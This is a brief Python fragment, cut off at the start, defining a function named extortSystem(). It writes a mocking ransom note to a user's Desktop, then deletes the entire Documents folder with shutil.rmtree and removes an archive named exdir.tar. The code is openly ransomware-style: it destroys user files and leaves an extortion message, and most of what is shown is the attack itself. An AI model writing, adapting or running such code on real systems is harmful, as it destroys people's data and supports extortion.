...
def extortSystem():
	...
	ransomNote = open("/home/ubuntu/Desktop/readme.txt","w")
	ransomNote.write("All your bases are belong to us. Hahaha")
	ransomNote.close()

	shutil.rmtree("/home/ubuntu/Documents")
    	os.remove("/home/ubuntu/exdir.tar")
